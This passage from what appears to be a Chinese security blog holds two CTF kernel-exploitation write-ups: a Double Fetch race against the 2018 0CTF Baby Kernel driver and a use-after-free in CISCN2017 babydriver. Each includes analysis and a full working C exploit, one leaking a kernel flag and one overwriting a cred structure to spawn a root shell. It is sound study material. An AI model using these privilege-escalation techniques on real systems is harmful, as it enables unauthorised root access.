<p>一个典型的 <code>Double Fetch</code> 漏洞原理如下图所示，一个用户态线程准备数据并通过系统调用进入内核，该数据在内核中有两次被取用，内核第一次取用数据进行安全检查（如缓冲区大小、指针可用性等），当检查通过后内核第二次取用数据进行实际处理。而在两次取用数据之间，另一个用户态线程可创造条件竞争，对已通过检查的用户态数据进行篡改，在真实使用时造成访问越界或缓冲区溢出，最终导致内核崩溃或权限提升。</p>
</blockquote>
<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202304041615674.png" alt="image-20230404161502570" style="zoom:50%;" />

<p>因为 <code>CTF wiki</code> 上这里总结的非常好（建议反复阅读 QAQ ），即使再叙述一遍也感觉意义不大，所以这里直接进行了引用</p>
<p>原文链接：<a target="_blank" rel="noopener" href="https://ctf-wiki.org/pwn/linux/kernel-mode/exploitation/double-fetch/">Double Fetch - CTF Wiki (ctf-wiki.org)</a></p>
<h3 id="2018-0CTF-Finals-Baby-Kernel"><a href="#2018-0CTF-Finals-Baby-Kernel" class="headerlink" title="2018 0CTF Finals Baby Kernel"></a>2018 0CTF Finals Baby Kernel</h3><p>题目链接：<a target="_blank" rel="noopener" href="https://github.com/cc-sir/ctf-challenge/tree/master/2018%200CTF%20Finals%20Baby%20Kernel">https://github.com/cc-sir/ctf-challenge/tree/master/2018%200CTF%20Finals%20Baby%20Kernel</a></p>
<h4 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h4><h5 id="SMAP-x2F-SMEP"><a href="#SMAP-x2F-SMEP" class="headerlink" title="SMAP&#x2F;SMEP"></a>SMAP&#x2F;SMEP</h5><p><code>SMAP</code> 即<code>管理模式访问保护</code>（Supervisor Mode Access Prevention），当开启这个保护后，在内核模式下无论是写入或者读取用户模式下的数据都会造成内存异常。<code>SMEP</code> （Supervisor Mode Execution Prevention）则是 <code>管理模式执行保护</code>，阻止内核空间中执行用户空间的数据。</p>
<h5 id="启动文件的设置"><a href="#启动文件的设置" class="headerlink" title="启动文件的设置"></a>启动文件的设置</h5><p><code>lsmod</code> 命令查看模块基地址为 <code>0</code> ，需要本地调试的时候修改 <code>init</code> 文件（改完之后，再将文件系统打包），将原本的 <code>setsid cttyhack setuidgid 1000 sh</code> 改为 <code>setsid cttyhack setuidgid 0 sh</code> 即可。</p>
<p>关闭 <code>kaslr</code> 的话，在 <code>start.sh</code> 文件的此处加上 <code>nokaslr</code> 即可（如下）</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202303292040104.png" alt="image-20230329204004810"></p>
<p>内核中以 <code>printk</code> 输出的内容，可以通过 <code>dmesg</code> 命令查看。前提是需要关闭 <code>dmesg_restrict</code> ，否则无法查看 <code>printk</code> 信息，关闭方法如下：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">echo 0 &gt; /proc/sys/kernel/dmesg_restrict</span><br></pre></td></tr></table></figure>

<p>系统内核参数 <code>kernel.dmesg_restrict</code> 用于控制普通用户是否可以查看内核日志 <code>dmesg</code>。当该参数值为1时，只有 <code>root</code> 用户才能查看内核日志，而普通用户则无法查看。而将该参数值设置为0，允许普通用户查看内核日志。</p>
<p><strong>注意：本题由于从内核中访问了用户态的数据，所以要关闭 <code>SMAP</code> 保护，否则会导致 <code>kernel panic</code></strong></p>
<h4 id="逆向分析"><a href="#逆向分析" class="headerlink" title="逆向分析"></a>逆向分析</h4><p>当 <code>a2</code> 为 <code>0x1337</code> 会做三个检查</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202304031554946.png" alt="image-20230403155425780"></p>
<p>发现第一个 <code>_chk_range_not_ok</code> 函数的第三个参数是 <code>(&amp;current_task) + 0x1358</code> ，这个位置是 <code>stack pointer</code> 字段，记录了栈区的结束地址，也就是用户空间的最大范围。通过调试也可以印证（如下）</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202304031742899.png" alt="image-20230403174212778"></p>
<p><code>_chk_range_not_ok</code> 函数是第一个参数加第二个参数大于第三个参数的情况下返回 <code>True</code>  ，但该函数的外面还有一个 <code>!</code> ，所以这里的想过 <code>if</code> 的话，需要满足第一个参数加第二个参数小于第三个参数</p>
<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202304032107333.png" alt="image-20230403210735151" style="zoom:67%;" />



<p>这里出现了一个 <code>*(_QWORD *)v5</code> 和 <code>*(int *)(v5+8)</code> ，这个格式可以推断出来他们是结构体中的成员变量，因为拿 <code>*(_DWORD)(v5+8)</code> 去和 <code>flag</code> 的长度做了比较，可以猜测 <code>*(_DORD)(v5+8)</code> 是 我们输入<code>flag</code> 字符串的长度，结合前面分析 <code>_chk_range_not_ok</code> 函数第三个参数是用户空间的最大范围，所以这里是某个值加上输入字符串的长度，要小于用户区的最大范围，因此推断这个值应该是我们输入 <code>flag</code> 的起始地址</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202304032113941.png" alt="image-20230403211351891"></p>
<p>所以创建一个结构体，此时的代码如下</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202304040927250.png" alt="image-20230404092707055"></p>
<p>查看下面的代码知道 <code>v2</code> 就是 <code>rdx</code> ，也就是 <code>baby_ioctl</code> 函数第三个参数，后来将这个参数赋值为 <code>v5</code> ，因此在用户模式调用 <code>baby_ioctl</code> 函数时，第三个参数传入提前写好的结构体的指针即可。</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202304040928159.png" alt="image-20230404092839113"></p>
<p>最后完整的分析一遍 <code>baby_ioctl</code> 函数（如下图）</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202304040933400.png" alt="image-20230404093312297"></p>
<p>在调用 <code>ioctl</code> 的时候，第二个参数如果为 <code>0x6666</code> 则会泄露出内核中存放 <code>flag</code> 的地址。</p>
<p>如果第二个参数为 <code>0x1337</code> 并且第三个参数加上 <code>0x10</code> 小于用户区的最大空间并且第三个参数加上字符串的长度小于用户区的最大空间并且字符串的长度（这个长度并非真的是字符串的实际长度，而是结构体中 <code>length</code> 成员的值）要等于内核中存放的 <code>flag</code> 长度，就去遍历 <code>flag_addr</code> 与 真正的 <code>flag</code> 做对比，如果完全一样则将 <code>flag</code> 输出出来。</p>
<h4 id="漏洞产生"><a href="#漏洞产生" class="headerlink" title="漏洞产生"></a>漏洞产生</h4><p>正常分析代码的话，确实找不到漏洞。这个程序希望我们拿用户态程序中的 <code>flag</code> 和内核中 <code>flag</code> 做对比，只有完全一样才输出 <code>flag</code>，程序专门检测了用户态程序中 <code>flag</code> 的地址是否位于用户区内。现在的情况做成图片（如下）</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202304041028572.png" alt="image-20230404102814465"></p>
<p>我们传入 <code>ioctl</code> 函数第三个参数是 <code>0x601100</code> （地址只是举个例子）也就是结构体的地址，结构体第一个成员是指针 <code>ptr</code>，只有 <code>ptr</code> 在用户区内（也就是为 <code>flag in the user_space</code>）才能通过第一个检查，不过这样就没办法通过第二个检查了，因为我们不可能碰巧在用户区自定义的 <code>flag</code> 和内核中的 <code>flag</code> 一样。</p>
<p>可是如果我们开启一个线程，在程序通过第一个检查后，不断将 <code>ptr</code> 改成 <code>flag in the kernel_space</code> （提前将内核中的 <code>flag</code> 地址泄露出来），这样到了第二个检查时，程序会将内核中的 <code>flag</code> 与自己做检查，从而绕过第二个检查，输出 <code>flag</code> 。问题在于我们不确定什么时候程序通过了第一个检查，所以要写一个循环，不断执行 <code>ioctl</code> ，同时开启线程也不断循环去改变 <code>ptr</code> ，当碰巧程序通过了第一个检查时，线程正好也将 <code>ptr</code> 改变成了 <code>flag in the kernel_space</code> ，此时得到 <code>flag</code> </p>
<h4 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//gcc exp.c -o exp -w -static -pthread</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> true_flag_address;</span><br><span class="line"><span class="type">int</span> over=<span class="number">0</span>;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">info</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">	<span class="type">char</span> *flag;</span><br><span class="line">	<span class="type">int</span> length;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">change_flag</span><span class="params">(<span class="type">void</span> *a)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">info</span> *<span class="title">s</span> =</span> (<span class="keyword">struct</span> info *)a;</span><br><span class="line">    <span class="keyword">while</span> (over==<span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        s-&gt;flag = (<span class="type">char</span> *)true_flag_address;</span><br><span class="line">    &#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;debug1 %d \n&quot;</span>,s-&gt;length);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> buf[<span class="number">0x1000</span>];</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">info</span> <span class="title">flag_info</span>;</span></span><br><span class="line">    <span class="type">pthread_t</span> tt;</span><br><span class="line">    setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">    setvbuf(<span class="built_in">stdin</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">    setvbuf(<span class="built_in">stderr</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="type">int</span> fd1 = open(<span class="string">&quot;/dev/baby&quot;</span>, O_RDWR);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;fd1-------&gt;%d\n&quot;</span>, fd1);</span><br><span class="line">    ioctl(fd1, <span class="number">0x6666</span>, <span class="number">0x0</span>);</span><br><span class="line">    system(<span class="string">&quot;dmesg &gt; 1.txt&quot;</span>);</span><br><span class="line">    <span class="type">int</span> fd2 = open(<span class="string">&quot;1.txt&quot;</span>, O_RDWR);</span><br><span class="line">    lseek(fd2, <span class="number">-0x1000</span>, SEEK_END);</span><br><span class="line">    read(fd2, buf, <span class="number">0x1000</span>);</span><br><span class="line">    close(fd2);</span><br><span class="line">    <span class="type">char</span> *index = <span class="built_in">strstr</span>(buf, <span class="string">&quot;Your flag is at &quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (index == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;not found!&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        index += <span class="number">16</span>;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;flag address ------&gt; &quot;</span>);</span><br><span class="line">        write(<span class="number">1</span>, index, <span class="number">16</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> *str = <span class="literal">NULL</span>;</span><br><span class="line">    true_flag_address = strtoull(index, &amp;str, <span class="number">16</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\nflag1 true_flag_adddress ----------&gt; %llx\n&quot;</span>, true_flag_address);</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> false_flag[] = <span class="string">&quot;a&quot;</span>;</span><br><span class="line">    flag_info.length = <span class="number">33</span>;</span><br><span class="line">    flag_info.flag = false_flag;</span><br><span class="line"></span><br><span class="line">    pthread_create(&amp;tt, <span class="literal">NULL</span>, change_flag, &amp;flag_info);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">1000</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        ioctl(fd1, <span class="number">0x1337</span>, &amp;flag_info);</span><br><span class="line">        flag_info.flag = false_flag;</span><br><span class="line">    &#125;</span><br><span class="line">    over = <span class="number">1</span>;</span><br><span class="line">    pthread_join(tt, <span class="literal">NULL</span>);</span><br><span class="line">    close(fd1);</span><br><span class="line">    system(<span class="string">&quot;dmesg | grep flag&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202304041048928.png" alt="image-20230404104852837"></p>
<h3 id="参考文章："><a href="#参考文章：" class="headerlink" title="参考文章："></a>参考文章：</h3><p>[<a target="_blank" rel="noopener" href="https://bbs.kanxue.com/thread-262426.htm#msg_header_h2_8">原创]Linux Kernel Pwn_1_Double fetch-二进制漏洞-看雪论坛-安全社区|安全招聘|bbs.pediy.com (kanxue.com)</a></p>
<p><a target="_blank" rel="noopener" href="https://ctf-wiki.org/pwn/linux/kernel-mode/exploitation/double-fetch/#_1">Double Fetch - CTF Wiki (ctf-wiki.org)</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_40827990/article/details/97301141?spm=1001.2014.3001.5502">(47条消息) Linux kernel Exploit 内核漏洞学习(1)-Double Fetch_钞sir的博客-CSDN博客</a></p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="https://zikh26.github.io/posts/406ce0e2.html">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="ZIKH26">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="ZIKH26's Blog">
      <meta itemprop="description" content="万古凡间一过客，九天之上第一仙">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="undefined | ZIKH26's Blog">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/posts/406ce0e2.html" class="post-title-link" itemprop="url">关于 kernel-UAF 的学习总结</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>
      

      <time title="创建时间：2023-05-15 07:36:47 / 修改时间：08:59:14" itemprop="dateCreated datePublished" datetime="2023-05-15T07:36:47+08:00">2023-05-15</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">分类于</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/" itemprop="url" rel="index"><span itemprop="name">学习总结</span></a>
        </span>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <p>终于来到了关于内核的学习，目前打算浅尝一下内核的基础知识和漏洞。之后每个学习的新漏洞都单独写一篇文章，每篇学到的新的前置知识都放到对应的文章中吧，暂时先不做汇总。</p>
<h3 id="CISCN2017-Pwn-babydriver"><a href="#CISCN2017-Pwn-babydriver" class="headerlink" title="CISCN2017_Pwn_babydriver"></a>CISCN2017_Pwn_babydriver</h3><h4 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h4><p>将 <code>rootfs.cpio</code> 文件系统映像解包，因为静态分析需要解包得到的 <code>ko</code> 文件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hen rootfs.cpio</span><br></pre></td></tr></table></figure>



<p>解包脚本 <code>hen</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="built_in">mv</span> <span class="variable">$1</span> <span class="variable">$1</span>.gz</span><br><span class="line">unar <span class="variable">$1</span>.gz</span><br><span class="line"><span class="built_in">mv</span> <span class="variable">$1</span> core</span><br><span class="line"><span class="built_in">mv</span> <span class="variable">$1</span>.gz <span class="variable">$1</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;[+]Successful&quot;</span></span><br></pre></td></tr></table></figure>



<p>打包脚本 <code>gen</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line">find . -print0 \</span><br><span class="line">| cpio --null -ov --format=newc \</span><br><span class="line">| gzip -9 &gt; <span class="variable">$1</span> </span><br><span class="line"><span class="built_in">mv</span> <span class="variable">$1</span> ..</span><br></pre></td></tr></table></figure>



<p>使用下面的命令，从 <code>bzImage</code> 文件中提取 <code>vmlinux</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/usr/src/linux-headers-$(uname -r)/scripts/extract-vmlinux bzImage &gt; vmlinux</span><br></pre></td></tr></table></figure>



<h5 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo gdb vmlinux</span><br></pre></td></tr></table></figure>



<p>下面的命令导入符号表，这个 <code>ko</code> 文件是刚刚解压 <code>rootfs.cpio</code> 得到的，后面这个 <code>0xffffffffc0000000</code> 需要在启动内核后，输入 <code>lsmod</code> 查看驱动的基地址从而得到。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">add-symbol-file /home/zikh/Desktop/babydriver/core/lib/modules/4.4.72/babydriver.ko 0xffffffffc0000000</span><br></pre></td></tr></table></figure>



<p>最后用下面的命令连接，调试程序</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">target remote localhost:1234</span><br></pre></td></tr></table></figure>

<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202303261609913.png" alt="image-20230326160909064"></p>
<p>设置断点需要用驱动的基地址加上 <code>ida</code> 中的偏移的位置打断点即可，这个基地址仅仅是和 <code>text</code> 段的地址相同，假设你现在想查看 <code>bss</code> 段上的某个变量，那么需要获取到 <code>bss</code> 段的基地址以及变量在 <code>bss</code> 段上的偏移。</p>
<p>假设要查看 <code>0xd90</code> 这个地址装载到内存中的实际地址。首先获取它在 <code>bss</code> 段上的偏移，发现 <code>bss</code> 段基地址为 <code>0xd00</code> 因此这个地址在 <code>bss</code> 段上偏移为 <code>0x90</code> </p>
<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202303270841264.png" alt="image-20230327084110128" style="zoom: 50%;" />



<p>获取 <code>bss</code> 段的基地址 （如下）</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202303270843604.png" alt="image-20230327084300554"></p>
<p>因此 <code>babydevice_t</code> 结构体地址是 <code>0xffffffffc00024d0</code> ，验证如下</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202303270853716.png" alt="image-20230327085333674"></p>
<h5 id="内核提权"><a href="#内核提权" class="headerlink" title="内核提权"></a>内核提权</h5><p>如果攻击者能够修改某个进程中的 <code>cred</code> 结构体中的 <code>gid</code> 和 <code>uid</code> <code>euid</code>等字段为 <code>0</code>，也就是能控制 <code>cred</code> 结构体的话，那么攻击者就获得了 <code>root</code> 权限，如果再开启一个 <code>shell</code> 的话，执行的任何命令也都是拥有 <code>root</code> 权限</p>
<h5 id="题目链接"><a href="#题目链接" class="headerlink" title="题目链接"></a>题目链接</h5><p><a target="_blank" rel="noopener" href="https://github.com/cc-sir/ctf-challenge/blob/master/2017CISCN%20babydriver/babydriver.tar">https://github.com/cc-sir/ctf-challenge/blob/master/2017CISCN%20babydriver/babydriver.tar</a></p>
<p>解压文件</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">tar -xvf babydriver.tar</span><br></pre></td></tr></table></figure>



<p><code>boot.sh</code> 文件</p>
<p>因为我的虚拟机不支持 <code>kvm</code> ，所以把原本 <code>-enable-kvm</code> 这段代码删了，为了方便之后使用 <code>gdb</code> 进行调试，加上了 <code>-gdb tcp::1234</code> 这段代码</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line">qemu-system-x86_64 -initrd rootfs.cpio -kernel bzImage -append <span class="string">&#x27;console=ttyS0 root=/dev/ram oops=panic panic=1&#x27;</span>  -monitor /dev/null -m 64M --nographic  -smp cores=1,threads=1 -cpu kvm64,+smep -gdb tcp::1234</span><br></pre></td></tr></table></figure>

<p>然后运行 <code>boot.sh</code> 启动即可。</p>
<h5 id="逆向分析"><a href="#逆向分析" class="headerlink" title="逆向分析"></a>逆向分析</h5><h6 id="babyopen"><a href="#babyopen" class="headerlink" title="babyopen"></a>babyopen</h6><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202303261513281.png" alt="image-20230326151320208"></p>
<p>申请了 <code>0x40</code> 的堆空间，并返回申请的内存首地址记录在 <code>babydevice_t</code> 结构体的 <code>device_buf</code> 字段</p>
<p>将 <code>0x40</code> 赋值为 <code>babydevice_t</code> 结构体的 <code>device_buf</code> 字段。需要注意的是 <code>babydevice_t</code> 结构体位于 <code>bss</code> 段上，这个全局变量就会存在被覆盖的可能，也就是说我连续 <code>open</code> 两次，那么第二次申请出来的内存块地址则会覆盖第一次申请的内存块地址。</p>
<h6 id="babyioctl"><a href="#babyioctl" class="headerlink" title="babyioctl"></a>babyioctl</h6><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202303262003083.png" alt="image-20230326200309961" style="zoom: 80%;" />

<p>该函数定义了一个 <code>0x10001</code> 的命令，先将 <code>babydevice_t</code> 结构体中的 <code>device_buf</code> 给释放掉，然后重新申请了一块内存，因为 <code>v3</code> 是 <code>rdx</code> 寄存器所赋值的，也就是 <code>babyioctl</code> 函数的第三个参数，而 <code>v3</code> 又给了 <code>v4</code> ，这个内存大小是我们可控的。</p>
<h6 id="babyread"><a href="#babyread" class="headerlink" title="babyread"></a>babyread</h6><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202303262016891.png" alt="image-20230326201609836"></p>
<p>该函数显示检查了 <code>device_buf</code> 是否为空，如果为空的话返回 <code>-1</code> ，如果 <code>device_buf_len</code> 大于 <code>write</code> 函数的第三个参数则将 <code>device_buf</code> 中的数据 <code>copy</code> 到用户区 <code>buffer</code> 空间中</p>
<p>这里 <code>ida</code> 生成的伪代码是有点问题的，正常情况是 <code>copy_to_user(buffer, babydev_struct.device_buf, v4);</code></p>
<h6 id="babywrite"><a href="#babywrite" class="headerlink" title="babywrite"></a>babywrite</h6><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202303262041836.png" alt="image-20230326204108774"></p>
<p>这个函数和 <code>babywrite</code> 是相反的，将数据从用户区的 <code>buffer</code> 复制到内核中的 <code>device_buf</code> 。</p>
<h6 id="babyrelease"><a href="#babyrelease" class="headerlink" title="babyrelease"></a>babyrelease</h6><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202303262101441.png" alt="image-20230326210113392" style="zoom: 80%;" />

<p>该函数可以将 <code>device_buf</code> 这个堆块给释放掉，但是释放内存后，未将指针置空，产生了 <code>UAF</code> 漏洞。</p>
<h4 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h4><p>连续 <code>open</code> 两次，分配出 <code>fd1</code> 和 <code>fd2</code> ，此时 <code>fd2</code> 将 <code>fd1</code> 的堆块地址覆盖掉了。再使用 <code>ioctl</code> 函数去执行那个 <code>0x10001</code> 的指令，将 <code>fd1</code> 释放掉 （其实释放的是 <code>fd2</code> ），再申请一个 <code>0xa8</code> 的堆块出来（用于伪造 <code>cred</code> 结构体 ），接着再用 <code>release</code> （也就是 <code>close</code> ） 函数将 <code>fd1</code> 释放掉（此时释放的是刚刚申请出来 <code>0xa8 </code>的那个堆块）</p>
<p>调用 <code>fork</code> 函数，创建一个子进程出来，并让父进程 <code>wait</code>。子进程产生时，就需要申请一个 <code>0xa8</code> 的堆块用来当做 <code>cred</code> 结构体，这时就会申请出来刚刚的我们释放掉的堆块。因为最后 <code>release</code> 是对 <code>fd1</code> 操作的，此时 <code>fd2</code> 是依然可以被写入数据的，向 <code>fd2</code> 中写入数据就等同于向子进程刚刚申请 <code>cred</code> 结构体中写入数据。此时父进程中 <code>device_buf</code> 记录的就是刚刚子进程申请堆块的地址。</p>
<p>将其 <code>cred</code> 结构体前 <code>0x28</code> 个字节覆盖成 <code>\x00</code> 执行 <code>system(&quot;/bin/sh&quot;)</code> 即可开启一个 <code>root</code> 权限下的 <code>shell</code> ，也就完成了所谓的内核提权。</p>
<p>上述思路的重点在于，<code>release</code> 操作对一个文件使用后，就无法再用 <code>write</code> 等函数进行该文件的操作了。但 <code>fd1</code> 和 <code>fd2</code> 其实都同时指向了<code>device_buf</code> （无论 <code>device_buf</code> 是哪个堆块地址）。因此用 <code>release</code> 函数释放 <code>fd1</code> 将申请的 <code>0xa8</code> 堆块给 <code>free</code> 掉，通过 <code>write</code> 函数对 <code>fd2</code> 操作依然可以写入数据。</p>
<h4 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">int</span> fd1=open(<span class="string">&quot;/dev/babydev&quot;</span>,O_RDWR);</span><br><span class="line">	<span class="type">int</span> fd2=open(<span class="string">&quot;/dev/babydev&quot;</span>,O_RDWR);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;fd1 ---&gt; %d\n&quot;</span>,fd1);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;fd2 ---&gt; %d\n&quot;</span>,fd2);</span><br><span class="line">	ioctl(fd1,<span class="number">0x10001</span>,<span class="number">0xa8</span>);</span><br><span class="line">	close(fd1);</span><br><span class="line">	<span class="type">int</span> id;</span><br><span class="line">	<span class="type">char</span> cred[<span class="number">0xa8</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line">	id=fork();</span><br><span class="line">	<span class="keyword">if</span>(id&lt;<span class="number">0</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;fork error!\n&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span>(id&gt;<span class="number">0</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		wait(<span class="literal">NULL</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span>(id==<span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">		write(fd2,cred,<span class="number">0x28</span>);</span><br><span class="line">		<span class="keyword">if</span>(getuid()==<span class="number">0</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;root user!\n&quot;</span>);</span><br><span class="line">			system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">			<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">		&#125;</span><br><span class="line">        &#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;emmmm!\n&quot;</span>);</span><br><span class="line">	close(fd2);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202303262347791.png" alt="image-20230326234748211"></p>
<h3 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h3><p><a target="_blank" rel="noopener" href="https://ctf-wiki.org/pwn/linux/kernel-mode/exploitation/uaf/">kernel UAF - CTF Wiki (ctf-wiki.org)</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_40827990/article/details/97272034?spm=1001.2014.3001.5502">(47条消息) kernel pwn – UAF_钞sir的博客-CSDN博客</a></p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
